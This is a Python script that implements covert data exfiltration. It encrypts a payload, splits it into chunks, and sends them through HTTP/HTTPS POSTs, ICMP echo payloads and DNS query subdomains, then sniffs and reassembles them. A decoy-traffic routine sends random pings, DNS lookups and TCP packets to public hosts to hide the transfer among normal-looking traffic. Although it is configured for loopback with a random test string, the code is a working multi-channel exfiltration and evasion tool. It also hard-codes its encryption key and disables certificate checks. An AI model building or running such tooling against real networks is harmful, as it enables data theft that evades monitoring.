import os
import random
import time
import threading
import zlib
import base64
import hashlib
import requests
import ssl
import string
import socket
from flask import Flask, request, jsonify
from scapy.all import IP, ICMP, UDP, Raw, send, sniff, DNS, DNSQR, TCP
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
SECRET_KEY = "mysecretkey12345"
stop_sniffer = threading.Event()
dict_lock = threading.Lock()
received_chunks = {}
dns_servers = ["127.0.0.1"]  # Replace with your actual IP
http_server_ip = "127.0.0.1"  # Replace with your actual IP
http_server_port = 5000
chunk_size = 32  # You can adjust this if needed

# Global variable to store the encrypted payload
encrypted_payload = None

# Generate a random string of specified length
def generate_random_payload(length):
    letters = string.ascii_letters + string.digits  # Exclude punctuation
    return ''.join(random.choice(letters) for i in range(length))

# Encryption and Compression
def encrypt_and_compress_payload(payload):
    compressed_payload = zlib.compress(payload.encode('utf-8'))
    key = hashlib.sha256(SECRET_KEY.encode('utf-8')).digest()
    cipher = AES.new(key, AES.MODE_CBC)
    encrypted = cipher.iv + cipher.encrypt(pad(compressed_payload, AES.block_size))
    return encrypted

def decrypt_and_decompress_payload(payload):
    try:
        key = hashlib.sha256(SECRET_KEY.encode('utf-8')).digest()
        iv = payload[:16]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(payload[16:]), AES.block_size)
        decompressed = zlib.decompress(decrypted)
        return decompressed.decode('utf-8')
    except Exception as e:
        raise ValueError(f"Error decrypting or decompressing payload: {e}")
    
def icmp_listener():
    interface_name = "Software Loopback Interface 1"  # Use the interface that was working before

    def process_packet(packet):
        if packet.haslayer(ICMP) and packet.haslayer(Raw):
            data = packet[Raw].load
            if data.startswith(b'PAYLOAD|'):
                parts = data.split(b'|', 2)
                if len(parts) == 3:
                    chunk_index = int(parts[1].decode('ascii'))
                    chunk = parts[2]
                    with dict_lock:
                        if chunk_index not in received_chunks:
                            received_chunks[chunk_index] = chunk
                            print(f"[Receiver - ICMP] Received chunk index {chunk_index}: {chunk}")
                        else:
                            print(f"[Receiver - ICMP] Duplicate chunk index {chunk_index} ignored.")

    print("[ICMP Listener] Starting ICMP listener...")
    sniff(filter="icmp",
          prn=process_packet,
          store=0,
          iface="Software Loopback Interface 1",  # Using the original interface name
          stop_filter=lambda x: stop_sniffer.is_set())
    
def dns_listener():
    interface_name = "Software Loopback Interface 1"  # Use the interface that was working before

    def process_packet(packet):
        if packet.haslayer(DNSQR):
            domain = packet[DNSQR].qname.decode('utf-8').rstrip('.')
            if domain.endswith('.example.com'):
                parts = domain.split('.')
                if len(parts) >= 3:
                    try:
                        chunk_index = int(parts[0])
                        chunk_b32 = parts[1]
                        chunk = base64.b32decode(chunk_b32 + '=' * ((8 - len(chunk_b32) % 8) % 8))
                        with dict_lock:
                            if chunk_index not in received_chunks:
                                received_chunks[chunk_index] = chunk
                                print(f"[Receiver - DNS] Received chunk index {chunk_index}: {chunk}")
                            else:
                                print(f"[Receiver - DNS] Duplicate chunk index {chunk_index} ignored.")
                    except Exception as e:
                        print(f"[Receiver - DNS] Error decoding chunk: {e}")
        elif packet.haslayer(DNS):
            # Process DNS responses if necessary
            pass  # For now, we're only processing DNS queries

    print("[DNS Listener] Starting DNS listener...")
    sniff(filter="udp port 53",
          prn=process_packet,
          store=0,
          iface="Software Loopback Interface 1",  # Using the original interface name
          stop_filter=lambda x: stop_sniffer.is_set())


# Split Payload
def split_payload(payload):
    chunk_sizes = {
        'http': 32,
        'https': 32,
        'icmp': 64,
        'dns': 48,  # DNS payload size is limited; adjust as needed
    }
    protocols = ['http', 'https', 'icmp', 'dns']
    assigned_chunks = {protocol: [] for protocol in protocols}

    min_chunk_size = min(chunk_sizes.values())
    chunks = [payload[i:i+min_chunk_size] for i in range(0, len(payload), min_chunk_size)]
    
    chunk_index = 0
    chunks_iter = iter(chunks)
    while True:
        for protocol in protocols:
            protocol_chunk_size = chunk_sizes[protocol]
            num_min_chunks = protocol_chunk_size // min_chunk_size
            chunk_data_pieces = []
            for _ in range(num_min_chunks):
                try:
                    chunk_piece = next(chunks_iter)
                    chunk_data_pieces.append(chunk_piece)
                except StopIteration:
                    break
            if chunk_data_pieces:
                chunk_data = b''.join(chunk_data_pieces)
                assigned_chunks[protocol].append((chunk_index, chunk_data))
                print(f"[Debug] Assigned chunk index {chunk_index} to protocol {protocol}: {chunk_data}")
                chunk_index += 1
            else:
                break
        else:
            continue
        break
    return assigned_chunks

# Flask Server for HTTP and HTTPS Reception
app = Flask(__name__)

@app.route('/receive_payload', methods=['POST'])
def receive_payload():
    try:
        data = request.json
        print(f"[HTTP/HTTPS - Debug] Received POST request: {data}")
        if not data or 'identifier' not in data or data['identifier'] != 'PAYLOAD':
            print("[HTTP/HTTPS] Invalid payload or missing identifier")
            return jsonify({"error": "Invalid payload"}), 400

        chunk_index = int(data['chunk_index'])
        chunk = base64.b64decode(data['chunk'].encode('ascii'))
        with dict_lock:
            if chunk_index not in received_chunks:
                received_chunks[chunk_index] = chunk
                print(f"[Receiver - HTTP/HTTPS] Received chunk index {chunk_index}: {chunk}")
            else:
                print(f"[Receiver - HTTP/HTTPS] Duplicate chunk index {chunk_index} ignored.")
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"[Receiver - HTTP/HTTPS] Error: {e}")
        return jsonify({"error": str(e)}), 500

def start_http_server():
    app.run(host=http_server_ip, port=http_server_port, debug=False, use_reloader=False)

def start_https_server():
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile='cert.pem', keyfile='key.pem')
    app.run(host=http_server_ip, port=https_server_port, ssl_context=context, debug=False, use_reloader=False)

# Send Payload
def send_icmp_payload(chunks, target_ip, retries=3):
    interface_name = "Software Loopback Interface 1"  # Use the same interface

    for i, chunk in chunks:
        for attempt in range(retries):
            try:
                payload = b'PAYLOAD|' + str(i).encode('ascii') + b'|' + chunk
                print(f"[Sender - ICMP] Sending ICMP packet with chunk index {i}, attempt {attempt + 1}")
                packet = IP(dst=target_ip)/ICMP(type=8)/Raw(load=payload)
                send(packet, iface=interface_name, verbose=False)
                time.sleep(0.1)  # Add a short delay
                break
            except Exception as e:
                print(f"[Sender - ICMP] Error sending chunk index {i}: {e}")

def send_dns_payload(chunks, target_ip, dns_server_ip):
    from scapy.all import DNS, DNSQR, UDP, IP, send

    interface_name = "Software Loopback Interface 1"  # Use the same interface

    for i, chunk in chunks:
        # Encode the chunk into Base32 to create a valid domain label
        chunk_b32 = base64.b32encode(chunk).decode('utf-8').rstrip('=')
        # Include chunk index in the domain name
        domain = f"{i}.{chunk_b32}.example.com"
        print(f"[Sender - DNS] Sending DNS query for chunk index {i}: {domain}")
        dns_query = IP(dst=dns_server_ip)/UDP()/DNS(rd=1, qd=DNSQR(qname=domain))
        send(dns_query, iface=interface_name, verbose=False)
        time.sleep(0.1)  # Slight delay to prevent flooding

def send_http_payload(chunks, target_ip):
    for i, chunk in chunks:
        url = f"http://{target_ip}:{http_server_port}/receive_payload"
        chunk_b64 = base64.b64encode(chunk).decode('ascii')
        data = {'chunk_index': i, 'chunk': chunk_b64, 'identifier': 'PAYLOAD'}
        print(f"[Sender - HTTP] Sending POST request to {url} with data: {data}")
        try:
            response = requests.post(url, json=data)
            print(f"[Sender - HTTP] Response: {response.status_code}, {response.text}")
        except Exception as e:
            print(f"[Sender - HTTP] Error sending chunk index {i}: {e}")

def send_https_payload(chunks, target_ip):
    for i, chunk in chunks:
        url = f"https://{target_ip}:{https_server_port}/receive_payload"
        chunk_b64 = base64.b64encode(chunk).decode('ascii')
        data = {'chunk_index': i, 'chunk': chunk_b64, 'identifier': 'PAYLOAD'}
        print(f"[Sender - HTTPS] Sending POST request to {url} with data: {data}")
        try:
            response = requests.post(url, json=data, verify=False)  # Set verify=False for self-signed certs
            print(f"[Sender - HTTPS] Response: {response.status_code}, {response.text}")
        except Exception as e:
            print(f"[Sender - HTTPS] Error sending chunk index {i}: {e}")

# Reassemble Payload
def reassemble_payload():
    with dict_lock:
        if not received_chunks:
            print("[Reassembler] No chunks received.")
            return

        # Log received chunks and ensure no duplicates
        expected_chunks = sorted(received_chunks.keys())
        print(f"[Reassembler] Received chunks (sorted): {expected_chunks}")
        
        # Check for missing chunks
        total_chunks = max(expected_chunks) + 1  # Assuming chunks are zero-indexed
        missing_chunks = set(range(total_chunks)) - set(received_chunks.keys())
        if missing_chunks:
            print(f"[Reassembler] Missing chunks: {missing_chunks}")
            return

        # Reassemble the payload
        try:
            sorted_chunks = [received_chunks[key] for key in expected_chunks]
            reassembled_payload = b''.join(sorted_chunks)
            print(f"[Reassembler] Reassembled payload (bytes): {reassembled_payload}")
        except KeyError as e:
            print(f"[Reassembler] KeyError while sorting chunks: {e}")
            return

        # Validate the reassembled payload against the original encrypted payload
        if len(reassembled_payload) != len(encrypted_payload):
            print(f"[Reassembler] Length mismatch: reassembled_payload ({len(reassembled_payload)}) != encrypted_payload ({len(encrypted_payload)})")
            return

        # Compare payloads byte-by-byte if lengths are equal
        if reassembled_payload == encrypted_payload:
            print("[Reassembler] Reassembled payload matches the original encrypted payload")
        else:
            mismatch_index = next(
                (i for i in range(len(reassembled_payload)) if reassembled_payload[i] != encrypted_payload[i]),
                None
            )
            print(f"[Reassembler] Payload mismatch at byte index {mismatch_index}.")
            return

        # Decrypt and decompress the payload
        try:
            decrypted_payload = decrypt_and_decompress_payload(reassembled_payload)
            print(f"[Receiver] Final Reassembled and Decrypted Payload: {decrypted_payload}")
        except Exception as e:
            print(f"[Receiver] Error decrypting payload: {e}")

def verify_chunks():
    with dict_lock:
        total_chunks = len(received_chunks)
        print(f"[Verifier] Total chunks received: {total_chunks}")
        if max(received_chunks.keys(), default=-1) + 1 != total_chunks:
            print("[Verifier] Some chunks are missing. Reassembly might fail.")

def debug_received_chunks():
    print("[Debug] Current received chunks:")
    with dict_lock:
        for idx, chunk in sorted(received_chunks.items()):
            print(f" - Chunk index {idx}: {chunk}")

# Dummy Traffic Sender
def send_dummy_traffic():
    while not stop_sniffer.is_set():
        try:
            # Decide randomly which dummy traffic to send
            traffic_type = random.choice(['icmp', 'dns', 'http', 'https'])
            if traffic_type == 'icmp':
                send_dummy_icmp()
            elif traffic_type == 'dns':
                send_dummy_dns()
            elif traffic_type == 'http':
                send_dummy_http()
            elif traffic_type == 'https':
                send_dummy_https()
            # Random sleep to mimic human behavior
            time.sleep(random.uniform(0.5, 2))
        except Exception as e:
            print(f"[Dummy Traffic] Error in dummy traffic thread: {e}")

# Dummy ICMP Traffic Sender
def send_dummy_icmp():
    target_ip = random.choice(['8.8.8.8', '1.1.1.1'])
    dummy_payload = os.urandom(random.randint(32, 64))  # Random binary data
    sequence_number = random.randint(0, 65535)
    ttl_value = random.randint(30, 128)
    packet = IP(dst=target_ip, ttl=ttl_value) / ICMP(type='echo-request', seq=sequence_number) / Raw(load=dummy_payload)
    send(packet, verbose=False)
    print(f"[Dummy ICMP] Sent dummy ICMP echo request to {target_ip}")

# Dummy DNS Traffic Sender
def send_dummy_dns():
    domain = random.choice(['google.com', 'facebook.com', 'amazon.com', 'github.com'])
    dns_server = random.choice(dns_servers)
    packet = IP(dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
    send(packet, verbose=False)
    print(f"[Dummy DNS] Sent dummy DNS query for {domain} to {dns_server}")

# Dummy HTTP Traffic Sender
def send_dummy_http():
    try:
        host = random.choice(['example.com', 'test.com', 'mywebsite.com'])
        path = random.choice(['/index.html', '/about', '/contact'])
        http_payload = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: DummyAgent\r\n\r\n".encode()
        packet = IP(dst=host) / TCP(dport=80, sport=random.randint(1024, 65535), flags='S') / Raw(load=http_payload)
        send(packet, verbose=False)
        print(f"[Dummy HTTP] Sent dummy HTTP GET request to {host}{path}")
    except Exception as e:
        print(f"[Dummy HTTP] Error: {e}")

# Dummy HTTPS Traffic Sender
def send_dummy_https():
    host = random.choice(['secure.com', 'bank.com', 'login.com'])
    tls_payload = os.urandom(random.randint(64, 128))  # Random binary data to simulate TLS handshake
    try:
        target_ip = socket.gethostbyname(host)
        packet = IP(dst=target_ip) / TCP(dport=443, sport=random.randint(1024, 65535), flags='S') / Raw(load=tls_payload)
        send(packet, verbose=False)
        print(f"[Dummy HTTPS] Sent dummy HTTPS Client Hello to {host}")
    except socket.gaierror:
        print(f"[Dummy HTTPS] Failed to resolve host {host}")

# Main
if __name__ == "__main__":
    target_ip = "127.0.0.1"  # Use loopback IP
    http_server_ip = "127.0.0.1"  # Use loopback IP
    dns_server_ip = "127.0.0.1"   # Use loopback IP

    # Use random payload to avoid over-compression
    text_payload = generate_random_payload(1500)  # Adjust the length as needed
    encrypted_payload = encrypt_and_compress_payload(text_payload)

    print(f"[Main] Encrypted payload size: {len(encrypted_payload)} bytes")
    assigned_chunks = split_payload(encrypted_payload)

    https_server_port = 5001  # Define the HTTPS server port

    print("[Main] Starting HTTP and HTTPS servers...")
    threading.Thread(target=start_http_server, daemon=True).start()
    threading.Thread(target=start_https_server, daemon=True).start()
    threading.Thread(target=icmp_listener, daemon=True).start()
    threading.Thread(target=dns_listener, daemon=True).start()

    time.sleep(2)  # Allow server to initialize

    threading.Thread(target=send_dummy_traffic, daemon=True).start()

    # Send payload
    print("[Main] Sending payload over HTTP...")
    send_http_payload(assigned_chunks['http'], http_server_ip)

    print("[Main] Sending payload over HTTPS...")
    send_https_payload(assigned_chunks['https'], http_server_ip)

    print("[Main] Sending payload over ICMP...")
    send_icmp_payload(assigned_chunks['icmp'], target_ip)

    print("[Main] Sending payload over DNS...")
    send_dns_payload(assigned_chunks['dns'], target_ip, target_ip)

    time.sleep(5)  # Allow time for packets to be processed

    verify_chunks()

    print("[Main] Reassembling payload...")
    reassemble_payload()
